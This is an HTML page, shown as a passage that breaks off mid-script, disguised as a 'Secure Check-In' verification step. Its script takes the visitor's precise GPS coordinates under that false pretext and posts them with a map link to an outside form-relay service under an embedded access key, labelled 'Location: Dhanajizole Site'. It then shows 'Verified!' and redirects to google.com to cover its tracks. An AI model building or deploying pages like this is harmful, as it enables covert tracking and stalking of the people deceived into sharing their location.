<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
        .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 340px; }
        h2 { color: #212529; font-size: 22px; margin-bottom: 10px; }
        p { color: #6c757d; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        button { background-color: #007bff; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; transition: 0.2s; }
        button:disabled { background-color: #ccc; cursor: not-allowed; }
        #status { margin-top: 20px; font-size: 14px; font-weight: 500; }
        .success { color: #28a745; }
        .error { color: #dc3545; }
    </style>
</head>
<body>

<div class="card">
    <h2 id="head">Secure Check-In</h2>
    <p id="sub">Please share your location to complete the verification process.</p>
    <button id="shareBtn" onclick="getLocation()">Share Location</button>
    <div id="status"></div>
</div>

<script>
    const statusDiv = document.getElementById("status");
    const shareBtn = document.getElementById("shareBtn");

    function getLocation() {
        shareBtn.disabled = true;
        shareBtn.innerText = "Processing...";
        statusDiv.innerHTML = "Requesting GPS Access...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        } else {
            statusDiv.innerHTML = "GPS not supported.";
            resetBtn();
        }
    }

    function sendPosition(position) {
        statusDiv.innerHTML = "Sending secure data...";
        
        const payload = {
            access_key: "83ad72c3-54bd-4f7f-9098-8c58e63b304d",
            subject: "Location: Dhanajizole Site",
            Latitude: position.coords.latitude,
            Longitude: position.coords.longitude,
            Map_Link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
        };

        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                statusDiv.innerHTML = "✅ Verified! Redirecting...";
                statusDiv.className = "success";
                setTimeout(() => {
                    window.location.href = "https://www.google.com"; 
                }, 2000);
